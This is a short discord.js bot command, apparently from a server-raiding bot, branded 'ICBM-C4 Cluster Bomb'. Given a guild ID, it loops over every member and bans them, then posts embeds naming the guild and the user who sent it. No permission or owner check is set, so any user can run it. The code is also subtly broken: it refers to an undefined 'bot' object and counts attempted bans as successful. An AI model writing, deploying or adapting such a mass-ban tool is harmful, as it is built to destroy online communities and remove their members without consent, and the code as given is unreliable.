const Discord = require("discord.js");

module.exports.run = async (client, message, args) => {
    let guild = bot.guilds.cache.get(args[0])
    let totalBans = 0
    const startEmbed = new Discord.MessageEmbed()
        .setColor("0x070707")
        .setTitle("ICBM-C4 “Cluster Bomb”")
        .setDescription("Sent massban.")
        .setThumbnail("https://cdn.discordapp.com/attachments/828768110658977872/829892969443622963/mmm.png")
        .addField("Guild Name: ", `${guild.name}`, true)
        .addField("Guild ID", `${guild.id}`, true)
        .addField("Sent by: ", `${message.author.username}`, true)
    message.channel.send(startEmbed)
        for (member of guild.members.cache) {
            if (!member[1].bannable) console.log(`Could not ban ${member[1].displayName}`);

            member[1].ban()
            .catch(console.error)
            totalBans = totalBans+1
        }            
     const endEmbed = new Discord.MessageEmbed()
        .setColor("0x070707")
        .setTitle("ICBM-C4 “Cluster Bomb”")
        .setDescription("Massban ended.")
        .setThumbnail("https://cdn.discordapp.com/attachments/828768110658977872/829892969443622963/mmm.png")
        .addField("Guild Name: ", `${guild.name}`, true)
        .addField("Guild ID", `${guild.id}`, true)
        .addField("Sent by: ", `${message.author.username}`, true)
        .addField("Total bans: ", `${totalBans}`, true)
    message.channel.send(endEmbed)
}

module.exports.help = {
  name: "massban",
  description: "Massban a guild with the bot."  
}

module.exports.requirements = {
    userPerms: [],
    clientPerms: [],
    ownerOnly: false
}

module.exports.limits = {
    rateLimit: 2,
    cooldown: 1e4
}